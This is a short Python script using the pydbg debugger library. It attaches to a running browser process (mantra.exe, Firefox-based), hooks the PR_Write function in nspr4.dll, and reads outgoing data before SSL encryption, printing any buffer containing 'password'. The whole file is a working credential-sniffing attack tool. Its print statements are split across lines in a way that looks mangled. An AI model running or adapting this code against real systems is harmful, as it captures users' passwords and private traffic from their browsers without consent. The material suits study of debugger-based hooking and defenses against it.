from pydbg import *
from pydbg.defines import *

import struct
import utils
import sys
import pida
import pgraph

dbg = pydbg()
found_firefox = False

pattern = "password"


def ssl_sniff(dbg, args):
    buffer = ""
    offset = 0

    while 1:
        byte = dbg.read_process_memory(args[1] + offset, 1)
        if byte != "\x00":
            buffer += byte
            offset += 1
            continue
        else:
            break
    if pattern in buffer:
        print
        "Pre-Encrypted: %s" % buffer
    return DBG_CONTINUE


for (pid, name) in dbg.enumerate_processes():
    if name.lower() == "mantra.exe":
        found_firefox = True
        hooks = utils.hook_container()

        dbg.attach(pid)

        print
        "[*] Attaching to MantraPortable.exe with pid %d " % pid

        hook_address = dbg.func_resolve_debuggee("nspr4.dll", "PR_Write")

        if hook_address:
            hooks.add(dbg, hook_address, 2, ssl_sniff, None)
            print
            "[*] nspr4.dll PE_Write hooked at :0x%08x " % hook_address
            break
        else:
            print
            "[*] could not reslove hook address"
            sys.exit(-1)

if found_firefox:
    print
    "[*] hook set ,continue process"
    dbg.run()

else:
    print
    "[*] Error could not find MantraPortable.exe"
    sys.exit(-1)
